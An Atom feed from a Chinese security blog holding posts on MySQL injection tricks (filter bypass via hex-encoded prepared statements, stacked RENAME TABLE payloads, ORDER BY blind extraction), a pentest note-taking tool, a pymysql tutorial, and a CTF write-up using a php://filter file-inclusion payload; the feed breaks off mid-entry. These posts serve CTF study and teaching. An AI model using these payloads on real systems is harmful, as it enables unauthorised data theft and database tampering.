<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Noel&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-06-03T09:05:42.370Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Noel</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Mysql 注入的一些tips</title>
    <link href="http://yoursite.com/2019/06/03/2019-06-03-Mysql-%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9Btips/"/>
    <id>http://yoursite.com/2019/06/03/2019-06-03-Mysql-注入的一些tips/</id>
    <published>2019-06-02T16:00:00.000Z</published>
    <updated>2019-06-03T09:05:42.370Z</updated>
    
    <content type="html"><![CDATA[<font color="green">用来总结Mysql注入的一些奇技淫巧</font><a id="more"></a><h3 id="No-Select"><a href="#No-Select" class="headerlink" title=" No Select "></a><font color="dark"> No Select </font></h3><p>不使用select情况下的注入</p><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><p>当注入语句可以多行执行的时候可以采用预处理的形式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @s = &quot;select * from users&quot;;</span><br><span class="line">prepare t from @s;</span><br><span class="line">execute t;</span><br></pre></td></tr></table></figure><p>在select被拦截的情况下，可以将@s的值编码处理绕过</p><p>十六进制编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @s =  0x73656c656374202a2066726f6d2075736572733b;</span><br></pre></td></tr></table></figure><p>或者是采用char</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @s = char(115,101,108,101,99,116,32,42,32,102,114,111,109,32,117,115,101,114,115);</span><br></pre></td></tr></table></figure><p>当然也可以使用concat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(&apos;sel&apos;,&apos;ect * from users&apos;);</span><br></pre></td></tr></table></figure><p><strong>需要注意的是</strong>在prepare语句中如果不是采用变量的形式，不能用编码，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; prepare t from char(115,101,108,101,99,116,32,42,32,102,114,111,109,32,117,115,101,114,115);</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;char(115,101,108,101,99,116,32,42,32,102,114,111,109,32,117,115,101,114,115)&apos; at line 1</span><br></pre></td></tr></table></figure><p>同样是在可多行执行的情况下，在已知列名和表名的基础上，可以通过修改表名来获取想要的数据，不过这种方法<strong>危害极大</strong>可能导致web服务无法正常运行。</p><p>以强网杯的一道题为例</p><p>对select进行了拦截</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</span><br></pre></td></tr></table></figure><p>通过<code>show tables</code>以及<code>desc table</code>的形式了解到存在两个表,<code>1919810931114514</code>以及    <code>words</code>,而flag在<code>1919810931114514</code>表中</p><p>所以一口气把<code>words</code>表修改为<code>words1</code>,把<code>1919810931114514</code>修改为<code>words</code>,同时，要给<code>1919810931114514</code>表增加一个<code>id</code>字段，总的payload就是</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">RENAME</span> TABLE `words` TO `words1`;<span class="built_in">RENAME</span> TABLE `<span class="number">1919810931114514</span>` TO `words`;ALTER TABLE `words` add id int;</span><br></pre></td></tr></table></figure><p>再使用<code>&#39; or &#39;1&#39;=&#39;1</code>进行查询即可得到flag。</p><p><strong>此外</strong>，还有另一种方法，<strong>handler</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">handler table_name open;</span><br><span class="line">handler table_name read first;</span><br><span class="line">handler table_name read next;</span><br><span class="line">handler table_name close;</span><br></pre></td></tr></table></figure><h3 id="Union"><a href="#Union" class="headerlink" title=" Union "></a><font color="dark"> Union </font></h3><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>Union Select没有被拦截，无疑是一件快乐的事，但如果括号和@不能用呢？</p><p>这个时候可以采用结合order by进行<strong>盲注</strong>的形式获取数据</p><p>不使用order by 情况下的查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag union select 1,2,3;</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">| id | submission_date | flag                |</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">|  1 | NULL            | flag&#123;just_for_test&#125; |</span><br><span class="line">|  1 | 2               | 3                   |</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>因为order by 是根据ascii顺序进行排序的，所以当我们按第三列来进行排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag union select 1,2,3 order by 3;</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">| id | submission_date | flag                |</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">|  1 | 2               | 3                   |</span><br><span class="line">|  1 | NULL            | flag&#123;just_for_test&#125; |</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>那么如何利用这一点进行注入呢？</p><p>假设submission_date可以在页面中被观察到，我们可以通过改变union select第三列的值来根据回显判断flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag union select 1,2,&apos;f&apos; order by 3;</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">| id | submission_date | flag                |</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">|  1 | 2               | f                   |</span><br><span class="line">|  1 | NULL            | flag&#123;just_for_test&#125; |</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag union select 1,2,&apos;g&apos; order by 3;</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">| id | submission_date | flag                |</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">|  1 | NULL            | flag&#123;just_for_test&#125; |</span><br><span class="line">|  1 | 2               | g                   |</span><br><span class="line">+----+-----------------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h3><blockquote><p>我要谈儿女情长，谈国家这种小事就先放一边啦</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;green&quot;&gt;用来总结Mysql注入的一些奇技淫巧&lt;/font&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="Mysql" scheme="http://yoursite.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>渗透信息记录</title>
    <link href="http://yoursite.com/2019/05/09/usefulMessage/"/>
    <id>http://yoursite.com/2019/05/09/usefulMessage/</id>
    <published>2019-05-08T16:00:00.000Z</published>
    <updated>2019-05-09T10:35:09.548Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">对渗透测试时的要点进行记录，目前仅为命令行形式，后续将采用HTML形式</font><br><a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font color="dark">前言</font></h3><p>在渗透测试时总是懒的记录下来一些信息，导致后续查找非常困难，所以想使用Python结合Mysql作出一个方便记录的小程序，如果采用Web应用展示的话会更加直观，所以后续会采用Flask，目前只有命令行的形式</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><font color="dark">介绍</font></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Usage:</span></span><br><span class="line"><span class="function">    <span class="title">sdomain</span> <span class="title">baidu.com</span>,<span class="title">GET</span> <span class="title">INFO</span> <span class="title">ABOUT</span> <span class="title">DOMAIN</span></span></span><br><span class="line"><span class="function">    <span class="title">adomain</span> <span class="title">baidu.com</span>,<span class="title">ADD</span> <span class="title">DOMAIN</span> <span class="title">INFO</span></span></span><br><span class="line"><span class="function">    <span class="title">udomain</span> <span class="title">baidu.com</span>,<span class="title">UPDATE</span> <span class="title">DOMAIN</span> <span class="title">INFO</span></span></span><br><span class="line"><span class="function">    <span class="title">ssdomain</span> <span class="title">www.baidu.com</span>,<span class="title">GET</span> <span class="title">INFO</span> <span class="title">ABOUT</span> <span class="title">SUBDOMAIN</span></span></span><br><span class="line"><span class="function">    <span class="title">asdomain</span> <span class="title">test.baidu.com</span>,<span class="title">ADD</span> <span class="title">SUBDOMAIN</span> <span class="title">INFO</span></span></span><br><span class="line"><span class="function">    <span class="title">usdomain</span> <span class="title">test.baidu.com</span>,<span class="title">UPDATE</span> <span class="title">SUBDOMAIN</span> <span class="title">INFO</span></span></span><br><span class="line"><span class="function">    <span class="title">use</span> <span class="title">baidu.com</span>,<span class="title">CHOOSE</span>,<span class="title">ONE</span> <span class="title">DOMAIN</span> <span class="title">FOR</span> <span class="title">LATER</span> <span class="title">OPERATE</span></span></span><br><span class="line"><span class="function">    <span class="title">show</span> <span class="title">domain</span>/<span class="title">subdomain</span>,<span class="title">SHOW</span> <span class="title">ALL</span> <span class="title">DOMAINS</span> <span class="title">OR</span> <span class="title">ALL</span> <span class="title">SUBDOMAIN</span> <span class="title">ABOUT</span> <span class="title">THE</span> <span class="title">SELECTED</span> <span class="title">DOMAIN</span></span></span><br><span class="line"><span class="function">    <span class="title">help</span>,<span class="title">SEE</span> <span class="title">THE</span> <span class="title">MESSAGE</span></span></span><br><span class="line"><span class="function">    <span class="title">exit</span>,<span class="title">EXIT</span></span></span><br></pre></td></tr></table></figure><p>使用cmd模块，所以使用<strong>python main.py</strong>进入主程序后采用上述usage进行使用</p><p>采用MySql进行数据存储，所以首先要进行数据库配置<br>在<strong>sqlhandle.py</strong>文件中可进行如下配置<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HOST = <span class="string">'localhost'</span></span><br><span class="line">USER = <span class="string">'root'</span></span><br><span class="line">PWD  = <span class="string">''</span></span><br><span class="line">DBS  = <span class="string">'attackinfo'</span></span><br></pre></td></tr></table></figure></p><p>将上述信息修改为自身信息即可</p><p>使用时记得开启MySql</p><p>操作演示<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">python main.py</span><br><span class="line"><span class="function">Usage:</span></span><br><span class="line"><span class="function">    <span class="title">sdomain</span> <span class="title">baidu.com</span>,<span class="title">GET</span> <span class="title">INFO</span> <span class="title">ABOUT</span> <span class="title">DOMAIN</span></span></span><br><span class="line"><span class="function">    <span class="title">adomain</span> <span class="title">baidu.com</span>,<span class="title">ADD</span> <span class="title">DOMAIN</span> <span class="title">INFO</span></span></span><br><span class="line"><span class="function">    <span class="title">udomain</span> <span class="title">baidu.com</span>,<span class="title">UPDATE</span> <span class="title">DOMAIN</span> <span class="title">INFO</span></span></span><br><span class="line"><span class="function">    <span class="title">ssdomain</span> <span class="title">www.baidu.com</span>,<span class="title">GET</span> <span class="title">INFO</span> <span class="title">ABOUT</span> <span class="title">SUBDOMAIN</span></span></span><br><span class="line"><span class="function">    <span class="title">asdomain</span> <span class="title">test.baidu.com</span>,<span class="title">ADD</span> <span class="title">SUBDOMAIN</span> <span class="title">INFO</span></span></span><br><span class="line"><span class="function">    <span class="title">usdomain</span> <span class="title">test.baidu.com</span>,<span class="title">UPDATE</span> <span class="title">SUBDOMAIN</span> <span class="title">INFO</span></span></span><br><span class="line"><span class="function">    <span class="title">use</span> <span class="title">baidu.com</span>,<span class="title">CHOOSE</span>,<span class="title">ONE</span> <span class="title">DOMAIN</span> <span class="title">FOR</span> <span class="title">LATER</span> <span class="title">OPERATE</span></span></span><br><span class="line"><span class="function">    <span class="title">show</span> <span class="title">domain</span>/<span class="title">subdomain</span>,<span class="title">SHOW</span> <span class="title">ALL</span> <span class="title">DOMAINS</span> <span class="title">OR</span> <span class="title">ALL</span> <span class="title">SUBDOMAIN</span> <span class="title">ABOUT</span> <span class="title">THE</span> <span class="title">SELECTED</span> <span class="title">DOMAIN</span></span></span><br><span class="line"><span class="function">    <span class="title">help</span>,<span class="title">SEE</span> <span class="title">THE</span> <span class="title">MESSAGE</span></span></span><br><span class="line"><span class="function">    <span class="title">exit</span>,<span class="title">EXIT</span></span></span><br><span class="line"><span class="function"><span class="title">MYINFO</span>&gt;<span class="title">sdomain</span> <span class="title">baidu.com</span> # 查询域名 <span class="title">baidu.com</span> 数据库中需要存在 <span class="title">baidu.com</span>的信息，不存在会提示先进行插入操作</span></span><br><span class="line"><span class="function">[-]<span class="title">No</span> <span class="title">Such</span> <span class="title">Domain</span>,<span class="title">Insert</span> <span class="title">First</span>!</span></span><br><span class="line"><span class="function"><span class="title">MYINFO</span>&gt;<span class="title">adomain</span> <span class="title">baidu.com</span> # 插入域名</span></span><br><span class="line"><span class="function">输入子域名，用逗号隔开: <span class="title">www.baidu.com</span>,<span class="title">test.baidu.com</span></span></span><br><span class="line"><span class="function">输入邮箱，用逗号隔开: <span class="title">laa</span>@<span class="title">qq.com</span>,<span class="title">lala</span>@<span class="title">baidu.com</span></span></span><br><span class="line"><span class="function">输入手机号，用逗号隔开: 13333333333,13888888888</span></span><br><span class="line"><span class="function">输入用户名，用逗号隔开: <span class="title">admin</span>,<span class="title">baidu</span></span></span><br><span class="line"><span class="function">[+]<span class="title">Insert</span> <span class="title">Success</span>!</span></span><br><span class="line"><span class="function"><span class="title">MYINFO</span>&gt;<span class="title">sdomain</span> <span class="title">baidu.com</span> # 插入成功后再次进行查询</span></span><br><span class="line"><span class="function"><span class="title">Domain</span>:</span></span><br><span class="line"><span class="function">        <span class="title">bai.com</span></span></span><br><span class="line"><span class="function"><span class="title">SubDomains</span>:</span></span><br><span class="line"><span class="function">        <span class="title">www.baidu.com</span></span></span><br><span class="line"><span class="function">        <span class="title">test.baidu.com</span></span></span><br><span class="line"><span class="function"><span class="title">Emails</span>:</span></span><br><span class="line"><span class="function">        <span class="title">laa</span>@<span class="title">qq.com</span></span></span><br><span class="line"><span class="function">        <span class="title">lala</span>@<span class="title">baidu.com</span></span></span><br><span class="line"><span class="function"><span class="title">Phone</span>:</span></span><br><span class="line"><span class="function">        13333333333</span></span><br><span class="line"><span class="function">        13888888888</span></span><br><span class="line"><span class="function"><span class="title">MYINFO</span>&gt;<span class="title">ssdomain</span> <span class="title">test.baidu.com</span> # 查询子域名信息</span></span><br><span class="line"><span class="function"><span class="title">Domain</span>:</span></span><br><span class="line"><span class="function">        <span class="title">test.baidu.com</span></span></span><br><span class="line"><span class="function"><span class="title">Title</span>:</span></span><br><span class="line"><span class="function">        <span class="title">None</span></span></span><br><span class="line"><span class="function"><span class="title">Infos</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Warn</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Vulnerability</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">MYINFO</span>&gt;<span class="title">show</span> <span class="title">domains</span> # 显示所有域名</span></span><br><span class="line"><span class="function">[+]<span class="title">Result</span>:</span></span><br><span class="line"><span class="function">        <span class="title">baidu.com</span></span></span><br><span class="line"><span class="function">        <span class="title">baishi.com</span></span></span><br><span class="line"><span class="function">        <span class="title">bai.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">MYINFO</span>&gt;<span class="title">use</span> <span class="title">baishi.com</span> # 选择域名，进行子域名操作</span></span><br><span class="line"><span class="function">[+]<span class="title">Useful</span> <span class="title">domain</span> <span class="title">baishi.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">MYINFO</span>&gt;<span class="title">show</span> <span class="title">subdomains</span> # 显示当前域名下所有子域名</span></span><br><span class="line"><span class="function">[+]<span class="title">Result</span>:</span></span><br><span class="line"><span class="function">        <span class="title">www.baishi.com</span></span></span><br><span class="line"><span class="function">        <span class="title">a.baishi.com</span></span></span><br><span class="line"><span class="function">        <span class="title">ccc.baishi.com</span></span></span><br><span class="line"><span class="function">        <span class="title">q.baishi.com</span></span></span><br><span class="line"><span class="function">        <span class="title">test.baishi.com</span></span></span><br><span class="line"><span class="function">        <span class="title">t.baishi.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">MYINFO</span>&gt;<span class="title">asdomain</span> <span class="title">lala.baishi.com</span> # 插入子域名信息</span></span><br><span class="line"><span class="function">输入网站标题: <span class="title">Web</span>测试</span></span><br><span class="line"><span class="function">输入泄漏的信息，例如<span class="title">robot.txt</span>，用&lt;<span class="title">x</span>&gt;隔开: <span class="title">robots.txt</span>&lt;<span class="title">x</span>&gt;1</span></span><br><span class="line"><span class="function">输入可能存在的漏洞信息，用&lt;<span class="title">x</span>&gt;隔开: 哈哈哈&lt;<span class="title">x</span>&gt;<span class="title">SQL</span>注入</span></span><br><span class="line"><span class="function">输入确认存在的漏洞信息，用&lt;<span class="title">x</span>&gt;隔开: /<span class="title">down</span>?<span class="title">q</span>=<span class="title">filename</span> <span class="title">q</span>任意文件下载&lt;<span class="title">x</span>&gt;/<span class="title">d</span>?<span class="title">a</span>=1 <span class="title">aSQL</span>注入</span></span><br><span class="line"><span class="function">[+]<span class="title">Insert</span> <span class="title">Success</span>!</span></span><br></pre></td></tr></table></figure></p><p>GITHUB地址:<br><a href="https://github.com/No4l/MyTools/tree/master/usefulMessage" target="_blank" rel="noopener">https://github.com/No4l/MyTools/tree/master/usefulMessage</a></p><blockquote><p>我转头，看见你走来，在阳光里，于是笑容从我心里溢出。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;对渗透测试时的要点进行记录，目前仅为命令行形式，后续将采用HTML形式&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python数据库操作</title>
    <link href="http://yoursite.com/2019/05/08/Python%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/"/>
    <id>http://yoursite.com/2019/05/08/Python数据库操作/</id>
    <published>2019-05-07T16:00:00.000Z</published>
    <updated>2019-05-08T12:54:03.648Z</updated>
    
    <content type="html"><![CDATA[<font color="green">Python的数据库操作，主要介绍Mysql</font><a id="more"></a><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a><font color="dark">安装</font></h3><p>不同的数据库需要安装不同的API模块，为了操作Mysql，我们首先需要安装pymysql<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pymysql</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ModuleNotFoundError: No module named <span class="string">'pymysql'</span></span><br></pre></td></tr></table></figure></p><p>如果出现这种情况表明还不存在MySQLdb<br>安装方式<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pymysql</span><br></pre></td></tr></table></figure></p><p><em>ps:python2用mysqldb</em></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a><font color="dark">使用</font></h3><p>首先需要把MySql服务打开，然后使用pymysql.connect进行连接<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>db = pymysql.connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'123456'</span>)<span class="comment">#最后可以加上要链接的数据库</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db</span><br><span class="line">&lt;pymysql.connections.Connection object at <span class="number">0x10804a908</span>&gt;</span><br></pre></td></tr></table></figure></p><p>之后要有一个操作游标负责执行SQL操作，最后使用fetchone或者是fetchall获得结果<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor.execute(sql)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor = db.cursor()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sql = <span class="string">'select @@version'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor.execute(sql)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor.fetchone()</span><br><span class="line">(<span class="string">'8.0.16'</span>,)</span><br></pre></td></tr></table></figure></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><font color="dark">注意</font></h3><p>在除了查询操作以外的其他操作中，执行了SQL语句后都需要进行commit，如果发生错误可以选择回滚，<br>例如:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sql = <span class="string">'delete from users where id=1'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  cursor.execute(sql)</span><br><span class="line">  db.commit()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  db.rollback()</span><br></pre></td></tr></table></figure></p><blockquote><p>见到你之后，一切都不重要了</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;green&quot;&gt;Python的数据库操作，主要介绍Mysql&lt;/font&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑预选赛 Web题目解析</title>
    <link href="http://yoursite.com/2019/04/11/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Web/"/>
    <id>http://yoursite.com/2019/04/11/西湖论剑Web/</id>
    <published>2019-04-10T16:00:00.000Z</published>
    <updated>2019-04-11T09:33:11.274Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">西湖论剑预选赛 Web部分题目解析</font><br><a id="more"></a></p><h3 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a><font color="dark">babyt3</font></h3><p>签到题，题目首先给出提示<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'file'</span>]</span><br></pre></td></tr></table></figure></p><p>在参数上加上file,则会获得下一个提示<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include $_GET['file']</span><br><span class="line">&lt;!--hint: ZGlyLnBocA== --&gt;</span><br></pre></td></tr></table></figure></p><p>解密后是dir.php<br>使用php伪协议包含获取dir.php里的内容<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://61.164.47.198:10000/?<span class="title">file</span>=<span class="title">php</span>://<span class="title">filter</span>/<span class="title">read</span>=<span class="title">convert.base64</span>-<span class="title">encode</span>/<span class="title">resource</span>=./<span class="title">dir.php</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HTTP</span>/1.1 200 <span class="title">OK</span></span></span><br><span class="line"><span class="function"><span class="title">Date</span>: <span class="title">Thu</span>, 11 <span class="title">Apr</span> 2019 08:04:12 <span class="title">GMT</span></span></span><br><span class="line"><span class="function"><span class="title">Server</span>: <span class="title">Apache</span>/2.4.18 (<span class="title">Ubuntu</span>)</span></span><br><span class="line"><span class="function"><span class="title">Vary</span>: <span class="title">Accept</span>-<span class="title">Encoding</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 149</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">text</span>/<span class="title">html</span>; <span class="title">charset</span>=<span class="title">UTF</span>-8</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">include</span> $<span class="title">_GET</span>['<span class="title">file</span>']<span class="title">PD9waHAKJGEgPSBAJF9HRVRbJ2RpciddOwppZighJGEpewokYSA9ICcvdG1wJzsKfQp2YXJfZHVtcChzY2FuZGlyKCRhKSk7Cg</span>==</span></span><br><span class="line"><span class="function">&lt;!--<span class="title">hint</span>: <span class="title">ZGlyLnBocA</span>== --&gt;</span></span><br></pre></td></tr></table></figure></p><p>解密<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure></p><p>遍历后发现flag在根目录下，直接读取</p><h3 id="BreakOut"><a href="#BreakOut" class="headerlink" title="BreakOut"></a><font color="dark">BreakOut</font></h3><p>随便输入账号密码登陆<br>登陆后是一个留言界面，可以像管理员报告漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 